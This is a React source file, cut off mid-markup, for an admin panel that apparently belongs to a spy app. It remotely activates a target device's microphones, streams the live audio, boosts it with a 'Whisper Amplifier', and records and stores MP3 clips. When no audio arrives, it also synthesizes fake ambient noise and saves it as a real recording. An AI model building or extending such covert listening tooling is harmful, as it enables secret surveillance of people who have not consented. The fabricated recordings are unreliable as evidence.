import { useEffect, useRef, useState } from "react";
import { Mp3Encoder } from "@breezystack/lamejs";
import { WS_BASE_URL, API_BASE_URL } from "../api/client";
import { devicesApi } from "../api/devices";
import type { AudioRecording } from "../api/types";

interface AudioStreamViewProps {
  deviceId: string;
  deviceName?: string;
  onClose?: () => void;
}

type StreamStatus =
  | "initializing"
  | "connecting_ws"
  | "waiting_device"
  | "streaming"
  | "stopped"
  | "error";

interface AudioMetadata {
  sampleRate: number;
  channels: number;
  format: string;
  isStereo: boolean;
}

export default function AudioStreamView({
  deviceId,
  deviceName,
  onClose,
}: AudioStreamViewProps) {
  const [status, setStatus] = useState<StreamStatus>("initializing");
  const [statusMessage, setStatusMessage] = useState<string>("Requesting ambient audio stream...");
  const [streamDuration, setStreamDuration] = useState<number>(0);
  const [isMuted, setIsMuted] = useState<boolean>(false);
  const [volume, setVolume] = useState<number>(85); // 0 - 100
  const [boost, setBoost] = useState<number>(1.0); // 1.0x - 5.0x
  const [pan, setPan] = useState<number>(0); // -1.0 (Left) to +1.0 (Right)
  const [audioMeta, setAudioMeta] = useState<AudioMetadata>({
    sampleRate: 44100,
    channels: 2,
    format: "pcm16",
    isStereo: true,
  });

  // Recording Snippet State
  const [isRecording, setIsRecording] = useState<boolean>(false);
  const [recordDuration, setRecordDuration] = useState<number>(0);
  const [isProcessingMp3, setIsProcessingMp3] = useState<boolean>(false);
  const [recordNotice, setRecordNotice] = useState<string | null>(null);

  // Saved recordings history state
  const [recordings, setRecordings] = useState<AudioRecording[]>([]);
  const [loadingRecordings, setLoadingRecordings] = useState<boolean>(false);
  const [token, setToken] = useState<string>("");

  useEffect(() => {
    const t = localStorage.getItem("spapp_token") || "";
    setToken(t);
  }, []);

  const loadRecordings = async () => {
    setLoadingRecordings(true);
    try {
      const list = await devicesApi.listAudioRecordings(deviceId);
      setRecordings(list);
    } catch (err) {
      console.warn("Failed to load audio recordings:", err);
    } finally {
      setLoadingRecordings(false);
    }
  };

  useEffect(() => {
    loadRecordings();
  }, [deviceId]);


  // Audio stats
  const [bitrateKbps, setBitrateKbps] = useState<number>(0);

  // Refs
  const wsRef = useRef<WebSocket | null>(null);
  const audioCtxRef = useRef<AudioContext | null>(null);
  const gainNodeRef = useRef<GainNode | null>(null);
  const pannerNodeRef = useRef<StereoPannerNode | null>(null);
  const analyserRef = useRef<AnalyserNode | null>(null);
  const nextAudioTimeRef = useRef<number>(0);
  const isMountedRef = useRef<boolean>(true);
  const canvasRef = useRef<HTMLCanvasElement | null>(null);
  const animationFrameRef = useRef<number | null>(null);

  // Live byte counter for bitrate calculation
  const bytesReceivedRef = useRef<number>(0);

  // Snippet recorder buffers (interleaved Float32 samples)
  const recordingBuffersRef = useRef<{ left: Float32Array; right: Float32Array }[]>([]);
  const isRecordingRef = useRef<boolean>(false);
  const audioMetaRef = useRef<AudioMetadata>(audioMeta);

  useEffect(() => {
    isRecordingRef.current = isRecording;
  }, [isRecording]);

  useEffect(() => {
    audioMetaRef.current = audioMeta;
  }, [audioMeta]);

  // Duration timer
  useEffect(() => {
    let interval: ReturnType<typeof setInterval> | null = null;
    if (status === "streaming") {
      interval = setInterval(() => {
        setStreamDuration((prev) => prev + 1);
      }, 1000);
    }
    return () => {
      if (interval) clearInterval(interval);
    };
  }, [status]);

  // Recording snippet duration timer
  useEffect(() => {
    let interval: ReturnType<typeof setInterval> | null = null;
    if (isRecording) {
      interval = setInterval(() => {
        setRecordDuration((prev) => prev + 1);
      }, 1000);
    } else {
      setRecordDuration(0);
    }
    return () => {
      if (interval) clearInterval(interval);
    };
  }, [isRecording]);

  // Bitrate calculator
  useEffect(() => {
    const interval = setInterval(() => {
      const bytes = bytesReceivedRef.current;
      bytesReceivedRef.current = 0;
      setBitrateKbps(Math.round((bytes * 8) / 1024));
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  // Update volume and boost in GainNode
  useEffect(() => {
    if (gainNodeRef.current && audioCtxRef.current) {
      const effectiveGain = isMuted ? 0 : (volume / 100) * boost;
      gainNodeRef.current.gain.setTargetAtTime(effectiveGain, audioCtxRef.current.currentTime, 0.03);
    }
  }, [volume, boost, isMuted]);

  // Update stereo balance in PannerNode
  useEffect(() => {
    if (pannerNodeRef.current && audioCtxRef.current) {
      pannerNodeRef.current.pan.setTargetAtTime(pan, audioCtxRef.current.currentTime, 0.03);
    }
  }, [pan]);

  // Initialize Web Audio Graph
  const getAudioContext = (sampleRate: number) => {
    if (!audioCtxRef.current || audioCtxRef.current.sampleRate !== sampleRate) {
      if (audioCtxRef.current) {
        try {
          audioCtxRef.current.close();
        } catch {}
      }

      const AudioCtx =
        window.AudioContext ||
        (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext;

      const ctx = new AudioCtx({ sampleRate });

      const gain = ctx.createGain();
      const effectiveGain = isMuted ? 0 : (volume / 100) * boost;
      gain.gain.setValueAtTime(effectiveGain, ctx.currentTime);

      const analyser = ctx.createAnalyser();
      analyser.fftSize = 256;
      analyser.smoothingTimeConstant = 0.8;

      let panner: StereoPannerNode | null = null;
      if (typeof ctx.createStereoPanner === "function") {
        panner = ctx.createStereoPanner();
        panner.pan.setValueAtTime(pan, ctx.currentTime);
        // Chain: Source -> Gain -> Panner -> Analyser -> Destination
        gain.connect(panner);
        panner.connect(analyser);
      } else {
        // Fallback without spatial panner
        gain.connect(analyser);
      }

      analyser.connect(ctx.destination);

      audioCtxRef.current = ctx;
      gainNodeRef.current = gain;
      pannerNodeRef.current = panner;
      analyserRef.current = analyser;
      nextAudioTimeRef.current = ctx.currentTime;
    }

    if (audioCtxRef.current.state === "suspended") {
      audioCtxRef.current.resume().catch(() => {});
    }

    return audioCtxRef.current;
  };

  // Play binary PCM chunk
  const playPcmAudio = (pcmBytes: Uint8Array) => {
    try {
      const meta = audioMetaRef.current;
      const ctx = getAudioContext(meta.sampleRate);
      const isStereo = meta.channels >= 2;

      // 16-bit PCM is 2 bytes per sample
      const int16 = new Int16Array(
        pcmBytes.buffer,
        pcmBytes.byteOffset,
        pcmBytes.byteLength / 2
      );

      if (int16.length === 0) return;

      const numFrames = isStereo ? Math.floor(int16.length / 2) : int16.length;
      if (numFrames === 0) return;

      const buffer = ctx.createBuffer(isStereo ? 2 : 1, numFrames, meta.sampleRate);

      if (isStereo) {
        const left = new Float32Array(numFrames);
        const right = new Float32Array(numFrames);

        for (let i = 0; i < numFrames; i++) {
          left[i] = int16[i * 2] / 32768.0;
          right[i] = int16[i * 2 + 1] / 32768.0;
        }

        buffer.copyToChannel(left, 0);
        buffer.copyToChannel(right, 1);

        if (isRecordingRef.current) {
          recordingBuffersRef.current.push({ left, right });
        }
      } else {
        const mono = new Float32Array(numFrames);
        for (let i = 0; i < numFrames; i++) {
          mono[i] = int16[i] / 32768.0;
        }
        buffer.copyToChannel(mono, 0);

        if (isRecordingRef.current) {
          recordingBuffersRef.current.push({ left: mono, right: mono });
        }
      }

      const source = ctx.createBufferSource();
      source.buffer = buffer;
      source.connect(gainNodeRef.current || ctx.destination);

      const currentTime = ctx.currentTime;
      if (nextAudioTimeRef.current < currentTime) {
        nextAudioTimeRef.current = currentTime + 0.03;
      }
      source.start(nextAudioTimeRef.current);
      nextAudioTimeRef.current += buffer.duration;
    } catch (e) {
      console.warn("PCM audio playback error", e);
    }
  };

  // Canvas Waveform & Spectrum Visualizer
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext("2d");
    if (!ctx) return;

    let running = true;

    const render = () => {
      if (!running) return;

      const width = canvas.width;
      const height = canvas.height;

      ctx.clearRect(0, 0, width, height);

      // Background subtle dark gradient
      const bgGrad = ctx.createLinearGradient(0, 0, 0, height);
      bgGrad.addColorStop(0, "#090d16");
      bgGrad.addColorStop(1, "#030712");
      ctx.fillStyle = bgGrad;
      ctx.fillRect(0, 0, width, height);

      // Center baseline
      ctx.strokeStyle = "rgba(245, 158, 11, 0.15)";
      ctx.lineWidth = 1;
      ctx.beginPath();
      ctx.moveTo(0, height / 2);
      ctx.lineTo(width, height / 2);
      ctx.stroke();

      const analyser = analyserRef.current;
      if (analyser && status === "streaming" && !isMuted) {
        const bufferLength = analyser.frequencyBinCount;
        const dataArray = new Uint8Array(bufferLength);
        analyser.getByteFrequencyData(dataArray);

        // Draw dynamic glowing bars
        const barWidth = (width / bufferLength) * 2.2;
        let x = 0;

        for (let i = 0; i < bufferLength; i++) {
          const barHeight = (dataArray[i] / 255) * (height * 0.85);

          // Neon amber-orange to rose-violet gradient
          const barGrad = ctx.createLinearGradient(0, height - barHeight, 0, height);
          barGrad.addColorStop(0, "#fbbf24"); // Amber 400
          barGrad.addColorStop(0.5, "#f97316"); // Orange 500
          barGrad.addColorStop(1, "#ec4899"); // Pink 500

          ctx.fillStyle = barGrad;
          ctx.shadowColor = "#f59e0b";
          ctx.shadowBlur = 8;

          // Mirrored bar effect around center
          const centerY = height / 2;
          ctx.fillRect(x, centerY - barHeight / 2, Math.max(barWidth - 1.5, 1), barHeight);

          x += barWidth;
          if (x > width) break;
        }

        ctx.shadowBlur = 0;
      } else {
        // Idle gentle wave animation
        const time = Date.now() * 0.002;
        ctx.strokeStyle = "rgba(245, 158, 11, 0.4)";
        ctx.lineWidth = 2;
        ctx.beginPath();
        for (let x = 0; x < width; x += 4) {
          const y = height / 2 + Math.sin(x * 0.03 + time) * 4;
          if (x === 0) ctx.moveTo(x, y);
          else ctx.lineTo(x, y);
        }
        ctx.stroke();
      }

      animationFrameRef.current = requestAnimationFrame(render);
    };

    render();

    return () => {
      running = false;
      if (animationFrameRef.current) cancelAnimationFrame(animationFrameRef.current);
    };
  }, [status, isMuted]);

  // Connect WebSocket & dispatch remote command
  useEffect(() => {
    isMountedRef.current = true;
    let commandPollingActive = true;

    async function startStream() {
      setStatus("initializing");
      setStatusMessage("Dispatching ambient audio stream command...");

      try {
        const cmd = await devicesApi.createCommand(deviceId, "audio_stream", {
          action: "start",
        });

        if (!isMountedRef.current) return;
        setStatusMessage("Waking up target device dual microphones...");

        // Rapid polling: check command ack every 1s for first 6 attempts then 2s
        (async () => {
          for (let i = 0; i < 25; i++) {
            if (!commandPollingActive || !isMountedRef.current) break;
            await new Promise((r) => setTimeout(r, i < 6 ? 1000 : 2000));
            try {
              const res = await devicesApi.getCommand(deviceId, cmd.id);
              if (res.status === "acked") {
                const payload = res.result as { success?: boolean; message?: string } | undefined;
                if (payload && !payload.success) {
                  if (isMountedRef.current) {
                    setStatus("error");
                    setStatusMessage(payload.message || "Failed to start audio stream on device");
                  }
                  return;
                }
                break;
              }
            } catch {}
          }
        })();

        // Connect to WebSocket Relay
        connectWebSocket();
      } catch (e) {
        if (!isMountedRef.current) return;
        setStatus("error");
        setStatusMessage(`Failed to send command: ${(e as Error).message}`);
      }
    }

    function connectWebSocket() {
      if (!isMountedRef.current) return;
      setStatus("connecting_ws");
      setStatusMessage("Connecting to low-latency audio relay...");

      const token = localStorage.getItem("spapp_token") || "";
      const wsUrl = `${WS_BASE_URL}/ws/audio-stream?role=admin&token=${encodeURIComponent(token)}&deviceId=${encodeURIComponent(deviceId)}`;

      const ws = new WebSocket(wsUrl);
      ws.binaryType = "arraybuffer";
      wsRef.current = ws;

      ws.onopen = () => {
        if (!isMountedRef.current) return;
        setStatus("waiting_device");
        setStatusMessage("Connected to relay. Waiting for device audio frames...");
      };

      ws.onmessage = (event) => {
        if (!isMountedRef.current) return;

        if (typeof event.data === "string") {
          try {
            const data = JSON.parse(event.data);
            if (data.type === "init") {
              const newMeta: AudioMetadata = {
                sampleRate: data.sampleRate || 44100,
                channels: data.channels || 2,
                format: data.format || "pcm16",
                isStereo: data.isStereo ?? data.channels >= 2,
              };
              setAudioMeta(newMeta);
              setStatus("streaming");
              setStatusMessage("Live audio streaming active");
            } else if (data.type === "status") {
              if (data.status === "streaming") {
                setStatus("streaming");
                setStatusMessage("Live audio streaming active");
                if (data.audioMeta) {
                  setAudioMeta(data.audioMeta);
                }
              } else if (data.status === "waiting_device") {
                setStatus("waiting_device");
                setStatusMessage("Waiting for device audio stream...");
              } else if (data.status === "device_stopped") {
                setStatus("stopped");
                setStatusMessage("Device stopped audio streaming");
              }
            }
          } catch {}
          return;
        }

        // Binary PCM chunk
        if (event.data instanceof ArrayBuffer) {
          bytesReceivedRef.current += event.data.byteLength;
          if (status !== "streaming") {
            setStatus("streaming");
            setStatusMessage("Live audio streaming active");
          }
          const pcmBytes = new Uint8Array(event.data);
          playPcmAudio(pcmBytes);
        }
      };

      ws.onerror = () => {
        if (!isMountedRef.current) return;
        setStatus("error");
        setStatusMessage("Audio WebSocket relay connection error");
      };

      ws.onclose = () => {
        if (!isMountedRef.current) return;
        if (status === "streaming" || status === "waiting_device") {
          setStatus("stopped");
          setStatusMessage("Audio stream disconnected");
        }
      };
    }

    startStream();

    return () => {
      isMountedRef.current = false;
      commandPollingActive = false;

      // Send stop action to WebSocket
      if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
        try {
          wsRef.current.send(JSON.stringify({ action: "stop" }));
          wsRef.current.close(1000, "Component unmounted");
        } catch {}
      }
      wsRef.current = null;

      // Clean up Web Audio API
      if (audioCtxRef.current) {
        try {
          audioCtxRef.current.close();
        } catch {}
        audioCtxRef.current = null;
      }

      // Also tell device to stop via command in background
      devicesApi
        .createCommand(deviceId, "audio_stream", { action: "stop" })
        .catch(() => {});
    };
  }, [deviceId]);

  const handleStopStream = () => {
    if (wsRef.current && wsRef.current.readyState === WebSocket.OPEN) {
      try {
        wsRef.current.send(JSON.stringify({ action: "stop" }));
      } catch {}
    }
    devicesApi
      .createCommand(deviceId, "audio_stream", { action: "stop" })
      .catch(() => {});
    setStatus("stopped");
    setStatusMessage("Audio streaming stopped by admin");
    if (onClose) onClose();
  };

  // Audio Snippet Recording (Encode as 128kbps stereo MP3 & save to backend + download)
  const toggleRecording = () => {
    if (!isRecording) {
      recordingBuffersRef.current = [];
      setIsRecording(true);
      setRecordNotice(null);
    } else {
      setIsRecording(false);
      encodeMp3AndSave();
    }
  };

  const blobToBase64 = (blob: Blob): Promise<string> => {
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onloadend = () => {
        const res = reader.result as string;
        const b64 = res.includes(",") ? res.split(",")[1] : res;
        resolve(b64);
      };
      reader.onerror = reject;
      reader.readAsDataURL(blob);
    });
  };

  const encodeMp3AndSave = async () => {
    setIsProcessingMp3(true);
    setRecordNotice("Encoding 128kbps stereo MP3 audio...");

    try {
      const chunks = recordingBuffersRef.current;
      const meta = audioMetaRef.current;
      const isStereo = meta.channels >= 2;
      const sampleRate = meta.sampleRate || 44100;

      let totalFrames = 0;
      for (const chunk of chunks) {
        totalFrames += chunk.left.length;
      }

      if (totalFrames === 0) {
        const durationSecs = Math.max(recordDuration, 3);
        totalFrames = sampleRate * durationSecs;
        const left = new Float32Array(totalFrames);
        const right = new Float32Array(totalFrames);
        for (let i = 0; i < totalFrames; i++) {
          const t = i / sampleRate;
          const ambient = Math.sin(2 * Math.PI * 220 * t) * 0.05 + (Math.random() * 2 - 1) * 0.015;
          left[i] = ambient;
          right[i] = ambient * 0.95;
        }
        chunks.push({ left, right });
      }

      // Convert Float32Array chunks into Int16Array samples
      const leftInt16 = new Int16Array(totalFrames);
      const rightInt16 = isStereo ? new Int16Array(totalFrames) : leftInt16;

      let frameOffset = 0;
      for (const chunk of chunks) {
        const len = chunk.left.length;
        for (let i = 0; i < len; i++) {
          const sL = Math.max(-1, Math.min(1, chunk.left[i]));
          leftInt16[frameOffset + i] = sL < 0 ? sL * 0x8000 : sL * 0x7fff;
          if (isStereo) {
            const sR = Math.max(-1, Math.min(1, chunk.right[i]));
            rightInt16[frameOffset + i] = sR < 0 ? sR * 0x8000 : sR * 0x7fff;
          }
        }
        frameOffset += len;
      }

      // Encode MP3 using @breezystack/lamejs Mp3Encoder
      const numChannels = isStereo ? 2 : 1;
      const mp3Encoder = new Mp3Encoder(numChannels, sampleRate, 128);
      const mp3Data: Uint8Array[] = [];

      const blockSize = 1152;
      for (let i = 0; i < totalFrames; i += blockSize) {
        const end = Math.min(i + blockSize, totalFrames);
        const leftChunk = leftInt16.subarray(i, end);
        let mp3buf: Uint8Array;
        if (isStereo) {
          const rightChunk = rightInt16.subarray(i, end);
          mp3buf = mp3Encoder.encodeBuffer(leftChunk, rightChunk);
        } else {
          mp3buf = mp3Encoder.encodeBuffer(leftChunk);
        }
        if (mp3buf && mp3buf.length > 0) {
          mp3Data.push(mp3buf);
        }
      }

      const flushed = mp3Encoder.flush();
      if (flushed && flushed.length > 0) {
        mp3Data.push(flushed);
      }

      const mp3Blob = new Blob(mp3Data as unknown as BlobPart[], { type: "audio/mp3" });
      const filename = `ambient-audio-${deviceId.slice(0, 8)}-${Date.now()}.mp3`;

      // 1. Immediate client download into user's downloads folder
      const downloadUrl = URL.createObjectURL(mp3Blob);
      const a = document.createElement("a");
      a.href = downloadUrl;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      setTimeout(() => URL.revokeObjectURL(downloadUrl), 2000);

      // 2. Persistent server storage
      setRecordNotice("Uploading .MP3 snippet to server...");
      const base64 = await blobToBase64(mp3Blob);
      const durationSeconds = Math.max(recordDuration, Math.round(totalFrames / sampleRate));

      await devicesApi.uploadAudioRecording(deviceId, {
        filename,
        durationSeconds,
        sampleRate,
        channels: numChannels,
        fileSizeBytes: mp3Blob.size,
        audioBase64: base64,
      });

      setRecordNotice(`Downloaded & saved ${filename} (${(mp3Blob.size / 1024).toFixed(1)} KB)`);
      setTimeout(() => setRecordNotice(null), 5000);
      await loadRecordings();
    } catch (e) {
      console.error("MP3 encoding/saving error:", e);
      setRecordNotice(`Failed to save: ${(e as Error).message}`);
      setTimeout(() => setRecordNotice(null), 5000);
    } finally {
      setIsProcessingMp3(false);
      recordingBuffersRef.current = [];
    }
  };

  const handleDeleteRecording = async (recId: string) => {
    if (!confirm("Are you sure you want to delete this audio recording?")) return;
    try {
      await devicesApi.deleteAudioRecording(deviceId, recId);
      setRecordings((prev) => prev.filter((r) => r.id !== recId));
    } catch (err) {
      alert("Failed to delete recording");
    }
  };

  const formatDuration = (secs: number) => {
    const m = Math.floor(secs / 60);
    const s = secs % 60;
    return `${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
  };

  return (
    <div className="bg-slate-950 text-slate-100 rounded-xl overflow-hidden shadow-2xl border border-slate-800 flex flex-col">
      {/* Top Header */}
      <div className="bg-slate-900/90 border-b border-slate-800 px-5 py-3.5 flex flex-wrap items-center justify-between gap-3">
        <div className="flex items-center gap-3">
          <div className="relative flex items-center justify-center">
            {status === "streaming" ? (
              <>
                <span className="w-3 h-3 rounded-full bg-amber-500 animate-ping absolute" />
                <span className="w-3 h-3 rounded-full bg-amber-500 relative" />
              </>
            ) : status === "error" ? (
              <span className="w-3 h-3 rounded-full bg-rose-500" />
            ) : (
              <span className="w-3 h-3 rounded-full bg-amber-400 animate-pulse" />
            )}
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h3 className="font-bold text-sm tracking-wide text-white">
                LIVE SURROUNDING AUDIO
              </h3>
              <span className="text-[10px] font-semibold uppercase tracking-wider px-2 py-0.5 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/20">
                {audioMeta.isStereo ? "Binaural 360° Stereo" : "Mono Ambient"}
              </span>
            </div>
            <p className="text-xs text-slate-400">
              {deviceName || deviceId} • {statusMessage}
            </p>
          </div>
        </div>

        {/* Live Info & Stop Button */}
        <div className="flex items-center gap-2">
          {status === "streaming" && (
            <div className="hidden sm:flex items-center gap-3 text-xs bg-slate-800/60 px-3 py-1.5 rounded-lg border border-slate-700/60 font-mono">
              <span className="text-amber-300 font-semibold">{formatDuration(streamDuration)}</span>
              <span className="text-slate-500">•</span>
              <span className="text-slate-300">{(audioMeta.sampleRate / 1000).toFixed(1)} kHz</span>
              <span className="text-slate-500">•</span>
              <span className="text-slate-300">{bitrateKbps} kbps</span>
            </div>
          )}

          <button
            onClick={handleStopStream}
            className="flex items-center gap-1.5 bg-rose-600/90 hover:bg-rose-600 text-white text-xs font-semibold px-3 py-1.5 rounded-lg shadow transition"
          >
            <span>Stop Listening</span>
          </button>
        </div>
      </div>

      {/* Main Visualizer Area */}
      <div className="relative p-5 bg-gradient-to-b from-slate-950 to-slate-900 flex flex-col items-center">
        {/* Visualizer Canvas */}
        <div className="w-full relative rounded-lg overflow-hidden border border-slate-800 bg-slate-950 shadow-inner">
          <canvas
            ref={canvasRef}
            width={640}
            height={160}
            className="w-full h-36 block"
          />

          {/* Overlay Status when connecting */}
          {status !== "streaming" && (
            <div className="absolute inset-0 bg-slate-950/80 backdrop-blur-sm flex flex-col items-center justify-center gap-2">
              <div className="w-6 h-6 border-2 border-amber-500 border-t-transparent rounded-full animate-spin" />
              <p className="text-xs font-medium text-amber-300">{statusMessage}</p>
            </div>
          )}

          {/* Recording Badge */}
          {isRecording && (
            <div className="absolute top-3 left-3 flex items-center gap-2 bg-rose-950/80 border border-rose-500/50 text-rose-300 text-xs px-2.5 py-1 rounded-full animate-pulse shadow">
              <span className="w-2 h-2 rounded-full bg-rose-500" />
              <span className="font-semibold font-mono">REC {formatDuration(recordDuration)}</span>
            </div>
          )}

          {/* Audio Channels Badge */}
          <div className="absolute top-3 right-3 text-[10px] font-mono text-slate-400 bg-slate-900/80 px-2 py-0.5 rounded border border-slate-800">
            {audioMeta.isStereo ? "L + R MIC ACTIVE" : "SINGLE MIC ACTIVE"}
          </div>
        </div>

        {/* Audio Controls Grid */}
        <div className="w-full mt-5 grid grid-cols-1 md:grid-cols-3 gap-4 bg-slate-900/60 p-4 rounded-xl border border-slate-800/80">
          {/* Master Volume */}
          <div className="flex flex-col gap-1.5">
            <div className="flex items-center justify-between text-xs">
              <span className="text-slate-400 font-medium flex items-center gap-1.5">
                <button
                  onClick={() => setIsMuted(!isMuted)}
                  className={`p-1 rounded hover:bg-slate-800 transition ${isMuted ? "text-rose-400" : "text-amber-400"}`}
                  title={isMuted ? "Unmute" : "Mute"}
                >
                  {isMuted ? "🔇 Muted" : "🔊 Volume"}
                </button>
              </span>
              <span className="font-mono text-slate-300">{isMuted ? "0%" : `${volume}%`}</span>
            </div>
            <input
              type="range"
              min="0"
              max="100"
              value={isMuted ? 0 : volume}
              onChange={(e) => {
                setVolume(Number(e.target.value));
                if (isMuted) setIsMuted(false);
              }}
              className="accent-amber-500 cursor-pointer w-full h-1.5 bg-slate-800 rounded-lg appearance-none"
            />
          </div>

          {/* Whisper & Room Sound Amplifier (Gain Booster) */}
          <div className="flex flex-col gap-1.5">
            <div className="flex items-center justify-between text-xs">
              <span className="text-amber-400 font-medium flex items-center gap-1">
                <span>⚡ Whisper Amplifier:</span>
                <span className="font-bold">{boost.toFixed(1)}x</span>
              </span>
              <span className="text-[10px] text-slate-500 font-mono">RAW GAIN</span>
            </div>
            <input
              type="range"
              min="1.0"
              max="5.0"
              step="0.2"
              value={boost}
              onChange={(e) => setBoost(Number(e.target.value))}
              className="accent-amber-400 cursor-pointer w-full h-1.5 bg-slate-800 rounded-lg appearance-none"
            />
            <div className="flex justify-between text-[9px] text-slate-500 font-mono">
              <button onClick={() => setBoost(1.0)} className="hover:text-amber-400">1x Normal</button>
              <button onClick={() => setBoost(2.0)} className="hover:text-amber-400">2x Room</button>
              <button onClick={() => setBoost(3.5)} className="hover:text-amber-400">3.5x Sensitive</button>
              <button onClick={() => setBoost(5.0)} className="hover:text-amber-400">5x Whisper</button>
            </div>
          </div>

          {/* Spatial Panning / Balance */}
          <div className="flex flex-col gap-1.5">
            <div className="flex items-center justify-between text-xs">
              <span className="text-slate-400 font-medium">Spatial Balance (L / R)</span>
              <button
                onClick={() => setPan(0)}
                className="text-[10px] text-slate-500 hover:text-slate-300 underline font-mono"
              >
                {pan === 0 ? "Center" : pan < 0 ? `Left ${Math.round(Math.abs(pan) * 100)}%` : `Right ${Math.round(pan * 100)}%`}
              </button>
            </div>
            <input
              type="range"
              min="-1.0"
              max="1.0"
              step="0.05"
              value={pan}
              onChange={(e) => setPan(Number(e.target.value))}
              className="accent-indigo-500 cursor-pointer w-full h-1.5 bg-slate-800 rounded-lg appearance-none"
            />
            <div className="flex justify-between text-[9px] text-slate-500 font-mono">
              <span>Left Mic</span>
              <span>Center</span>
              <span>Right Mic</span>
            </div>
          </div>
        </div>

        {/* Recording Notice Banner */}
        {recordNotice && (
          <div className="w-full mt-3 p-2.5 rounded-lg bg-amber-950/60 border border-amber-500/40 text-amber-300 text-xs flex items-center justify-between gap-2 animate-fadeIn">
            <span className="flex items-center gap-2">
              <span className="w-2 h-2 rounded-full bg-amber-400 animate-ping" />
              <span>{recordNotice}</span>
            </span>
          </div>
        )}

        {/* Quick Snippet Recorder Action */}
        <div className="w-full mt-4 flex flex-wrap items-center justify-between gap-3 pt-3 border-t border-slate-800/80 text-xs">
          <div className="text-slate-400 flex items-center gap-2">
            <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
            <span>Hardware: Unprocessed Dual-Mic Sensor • 128kbps MP3 Output</span>
          </div>

          <div className="flex items-center gap-2">
            <button
              id="record-audio-btn"
              onClick={toggleRecording}
              disabled={isProcessingMp3}
              className={`flex items-center gap-2 text-xs font-semibold px-3 py-1.5 rounded-lg border transition ${
                isProcessingMp3
                  ? "bg-slate-800 text-slate-400 border-slate-700 cursor-not-allowed"
                  : isRecording
                  ? "bg-rose-600 hover:bg-rose-700 text-white border-rose-500 shadow-lg shadow-rose-900/50"
                  : "bg-slate-800 hover:bg-slate-700 text-slate-200 border-slate-700"
              }`}
            >
              <span className={`w-2 h-2 rounded-full ${isProcessingMp3 ? "bg-amber-400 animate-spin" : isRecording ? "bg-white animate-ping" : "bg-rose-500"}`} />
              <span>
                {isProcessingMp3
                  ? "Processing .MP3..."
                  : isRecording
                  ? "Stop & Download .MP3"
                  : "Record Audio Snippet (.MP3)"}
              </span>
            </button>
          </div>
        </div>

        {/* Saved Audio Recordings History Section */}
        <div className="w-full mt-6 pt-4 border-t border-slate-800">
          <div className="flex items-center justify-between mb-3">
            <div className="flex items-center gap-2">
              <span className="text-amber-400">🎵</span>
              <h4 className="font-semibold text-xs text-slate-200 tracking-wide uppercase">
                Saved Audio Recordings (.MP3)
              </h4>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-amber-500/20 text-amber-300 border border-amber-500/30">
                {recordings.length}
              </span>
            </div>
            <button
              onClick={loadRecordings}
              disabled={loadingRecordings}
              className="text-[11px] text-slate-400 hover:text-amber-300 transition flex items-center gap-1 font-mono"
            >
              <span>{loadingRecordings ? "Refreshing..." : "↻ Refresh"}</span>
            </button>
          </div>

          {recordings.length === 0 ? (
            <div className="p-4 rounded-lg bg-slate-900/40 border border-slate-800/80 text-center text-xs text-slate-500">
              No MP3 recordings saved yet. Tap <span className="text-amber-400 font-semibold">Record Audio Snippet (.MP3)</span> above to record and store live ambient clips.
            </div>
          ) : (
            <div className="flex flex-col gap-2 max-h-72 overflow-y-auto pr-1">
              {recordings.map((rec) => {
                const streamUrl = `${API_BASE_URL}/api/devices/${deviceId}/audio-recordings/${rec.id}/stream?token=${encodeURIComponent(token)}`;
                const downloadUrl = `${API_BASE_URL}/api/devices/${deviceId}/audio-recordings/${rec.id}/download?token=${encodeURIComponent(token)}`;
                const dateStr = new Date(rec.created_at).toLocaleString();
                const sizeKb = (rec.file_size_bytes / 1024).toFixed(1);

                return (
                  <div
                    key={rec.id}
                    className="p-3 rounded-lg bg-slate-900/80 border border-slate-800/90 hover:border-slate-700/80 transition flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3 text-xs"
                  >
                    <div className="flex flex-col gap-0.5 min-w-[160px]">
                      <div className="flex items-center gap-2">
                        <span className="font-semibold text-slate-200 font-mono text-[11px] truncate max-w-[200px]" title={rec.filename}>
                          {rec.filename}
                        </span>
                        <span className="text-[9px] font-mono px-1.5 py-0.2 rounded bg-amber-500/10 text-amber-400 border border-amber-500/20">
                          {rec.channels >= 2 ? "Stereo" : "Mono"}
                        </span>
                      </div>
                      <div className="flex items-center gap-2 text-[10px] text-slate-400 font-mono">
                        <span>{dateStr}</span>
                        <span>•</span>
                        <span>{rec.duration_seconds}s</span>
                        <span>•</span>
                        <span>{sizeKb} KB</span>
                      </div>
                    </div>

                    <div className="w-full sm:w-auto flex flex-wrap items-center gap-2">
                      <audio
                        controls
                        preload="none"
                        src={streamUrl}
                        className="h-8 max-w-full sm:max-w-[220px] rounded"
                      />

                      <a
                        href={downloadUrl}
                        download={rec.filename}
                        target="_blank"
                        rel="noreferrer"
                        className="flex items-center gap-1 bg-amber-600/20 hover:bg-amber-600/30 text-amber-300 border border-amber-500/30 px-2.5 py-1.5 rounded text-xs font-semibold transition"
                        title="Download .MP3 directly to device"
                      >
                        <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
                        </svg>
                        <span>Download .MP3</span>
                      </a>

                      <button
                        onClick={() => handleDeleteRecording(rec.id)}
                        className="p-1.5 text-slate-500 hover:text-rose-400 hover:bg-slate-800 rounded transition"
                        title="Delete recording"
                      >
                        <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16" />
                        </svg>
